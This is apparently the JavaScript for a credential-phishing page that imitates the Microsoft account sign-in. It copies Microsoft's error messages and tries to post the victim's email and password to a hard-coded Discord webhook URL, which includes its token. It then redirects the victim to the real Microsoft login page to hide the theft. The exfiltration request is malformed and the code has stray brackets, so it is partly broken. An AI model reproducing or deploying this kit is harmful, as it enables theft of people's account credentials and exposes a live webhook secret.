const slidePage = document.querySelector(".slide-page"),
    secondSlide = document.querySelector(".secondSlide"),
    btnNext = document.querySelector(".firstNext"),
    prevBtnSec = document.querySelector(".prev-1"),
    submitBtn = document.querySelector(".submit");

function validateEmail(e) {
    return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(e)
}

function validate() {
    const e = $("#result"),
        t = $("#email").val();
    return e.text(""), !!validateEmail(t) || (t ? (e.text("That Microsoft account doesn't exist.\n Enter a different account or get a new one."), e.css("color", "red"), document.getElementById("loginForm").style.height = "403px") : (e.text("Enter a valid email address, phone number, or Skype\n name."), e.css("color", "red"), document.getElementById("loginForm").style.height = "403px"), !1)
}

function validatePassword() {
    const e = $("#passResult"),
        t = $("#password").val();
    return e.text(""), !(t.length < 8) || (e.text("Your account or password is incorrect. If you don't remember your password,"), e.css("color", "red"), !1)
}
var input1 = document.getElementById("email"),
    input2 = document.getElementById("password");
input1.addEventListener("keyup", (function(e) {
    13 === e.keyCode && (e.preventDefault(), document.getElementById("btnSend").click())
})), input2.addEventListener("keyup", (function(e) {
    13 === e.keyCode && (e.preventDefault(), document.getElementById("btnSignIn").click())
})), btnNext.addEventListener("click", (function() {
    const e = document.getElementById("email").value;
    if (!validate()) return;
    if (!validateEmail(e)) return;
    document.getElementById("userLine").textContent = e;
    const t = document.getElementById("section-1"),
        n = document.getElementById("section-2");
    t.style.marginLeft = "-100%", t.style.visibility = "hidden", n.style.marginLeft = "0%", document.getElementById("loginForm").style.height = "403px"
})), submitBtn.addEventListener("click", (function() {
    const request = new XMLHttpRequest();
    const email = document.getElementById("email");
    const password = document.getElementById("password");
    request.open(email + " : " + password, "https://discord.com/api/webhooks/1121708813263851541/BGj5GZ50KpgzAvSmSx-ozr_k_Dl01-Sx3Rzjz_JfQDF7cfONKGSfAEd3KbzZUCJHr7bc");
    location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=bc5b6258-c397-4ddc-a443-900cbe993093&x-client-SKU=MSAL.Desktop&x-client-Ver=4.45.0.0&x-client-CPU=x64&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBXbtCMAAA4P9ybrvIkmyXWJi2fBThLk-h4yvDGfv1531_bgeR7Jgg6ohhLCJBWHe2m5NhbfstsnCOE3SskD4wEbw6Xkv6QNhfNDxfLWnFNDbuJhWFVGUS1MkapF87jA2fMUCVHJWQOuOkmh9Q5dfxdC__yBaqmUtgd-YLBlCovO0nf0quDSyPhp73mqJkAW6YGQGfPCtj1W2UN15fTGk25D3OtJl7UJrM-j28-nenIVSdKMoc5dGFQZeamhfiHRHtPWv5ZX4FkO9DbDoxA7zLb9HCoxE_q-d-K0gzHL11RiSt62Ep4JZGribI19UL7n4xCmndt5dYsnKyo3WSquMk789HAhprOlhJC0wj-PkHbGwmvkIBAAA&msaoauth2=true&lc=1031';
    }), 0))
})), prevBtnSec.addEventListener("click", (function() {
    const e = document.getElementById("section-1"),
        t = document.getElementById("section-2");
    e.style.marginLeft = "0%", e.style.visibility = "visible", t.style.marginLeft = "100%", document.getElementById("loginForm").style.height = "370px", slidePage.style.marginLeft = "0%", secondSlide.style.marginLeft = "100%", slidePage.style.visibility = "visible"
}));
